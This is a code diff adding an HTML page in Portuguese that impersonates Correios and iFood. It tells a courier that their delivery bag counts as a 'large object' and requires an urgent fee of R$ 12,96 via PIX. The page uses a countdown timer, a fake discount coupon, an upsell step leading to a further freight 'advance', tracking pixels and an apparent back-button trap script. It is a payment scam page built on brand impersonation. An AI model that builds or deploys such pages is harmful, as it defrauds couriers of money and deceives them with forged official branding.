@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#004b8f">
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#004b8f">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>iFood Entregador - Taxa de Objeto Grande</title>
+    <meta name="description" content="Regularize a taxa de objeto grande dos Correios para despacho da BAG.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=7.4">
+    <script src="/backguard.js?v=1.6"></script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <script>
+        window.pixelId = "69879d3cc070d5501c7e3fde";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script async defer src="js/pixel.js"></script>
+</head>
+
+<body data-page="upsell-correios">
+    <header class="correios-top">
+        <div class="correios-access">Acessibilidade</div>
+        <div class="correios-nav">
+            <button type="button" class="correios-menu" aria-label="Menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            <img src="assets/correios-logo.svg" alt="Correios" class="correios-logo">
+        </div>
+        <div class="correios-border"></div>
+    </header>
+
+    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+    <main class="container">
+        <section class="step upsell-correios-step" aria-hidden="false">
+            <p class="correios-breadcrumb"><span aria-hidden="true">&lsaquo;</span> Rastreamento</p>
+            <h1 class="correios-title">Rastreamento</h1>
+
+            <div class="correios-card">
+                <p class="correios-copy">
+                    <strong><span id="upsell-correios-lead-name">Parceiro</span>, sua BAG foi classificada como objeto grande.</strong>
+                    Para concluir o despacho no centro logistico dos Correios, e necessario regularizar a taxa obrigatoria de volume especial.
+                </p>
+
+                <div class="correios-price">
+                    <span>Taxa de objeto grande</span>
+                    <strong data-upsell-correios-price>R$ 12,96</strong>
+                </div>
+
+                <div class="correios-meta">
+                    <div class="correios-meta-row">
+                        <span>Frete selecionado</span>
+                        <strong id="upsell-correios-current-frete">Frete padrao iFood</strong>
+                    </div>
+                    <div class="correios-meta-row">
+                        <span>Referencia do pedido</span>
+                        <strong>#<span id="upsell-correios-current-txid">--</span></strong>
+                    </div>
+                </div>
+
+                <div class="correios-deadline">
+                    Prazo desta regularizacao: <b id="upsell-correios-timer">10:00</b>
+                </div>
+
+                <button id="btn-upsell-correios-accept" class="btn-primary correios-btn" type="button">
+                    Pagar taxa de objeto grande R$ 12,96
+                </button>
+
+                <button id="btn-upsell-correios-skip" class="btn-secondary correios-btn-secondary" type="button">
+                    Continuar sem pagar agora
+                </button>
+
+                <div id="upsell-correios-loading" class="inline-loading hidden" aria-hidden="true">
+                    <div class="spinner spinner--sm" aria-hidden="true"></div>
+                    <span>Gerando PIX da taxa dos Correios...</span>
+                </div>
+
+                <p class="correios-note">
+                    * Apos pagamento confirmado, voce segue para o ultimo passo de adiantamento do frete.
+                </p>
+            </div>
+
+            <div class="correios-banner">
+                <strong>Central Correios</strong>
+                <span>Suporte de rastreio e liberacao automatica de despacho.</span>
+            </div>
+        </section>
+    </main>
+
+    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+    <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
+        <div class="modal-card">
+            <div class="coupon-hero">
+                <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
+            </div>
+            <span class="modal-badge">Cupom exclusivo</span>
+            <h3 id="coupon-title">Desconto liberado no frete</h3>
+            <p id="coupon-message">Voce ganhou R$ 5,00 de desconto no frete da Bag.</p>
+            <span class="coupon-subtitle">Oferta valida agora nesta sessao</span>
+            <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
+        </div>
+    </div>
+
+    <script src="script.js?v=7.4" defer></script>
+</body>
+
+</html>
